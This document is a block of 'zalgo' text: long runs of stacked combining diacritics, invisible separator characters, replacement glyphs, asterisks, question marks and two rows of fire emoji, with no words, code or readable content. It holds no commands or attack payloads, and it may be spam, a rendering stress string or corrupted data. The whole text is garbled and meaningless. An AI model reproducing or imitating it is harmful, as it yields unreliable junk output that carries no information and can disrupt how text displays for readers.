̡̧͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̽͑⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̘͇͙̟̫͎͎̹̹̍̐̿̈́̈́͊🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̆͂́̈́̿͌̈́̋͂͌͡͝🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̴̛̛̛͖̜̬̯͉̥̣̯̆͂́̈́̿͌̈́̋͂͌͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡͝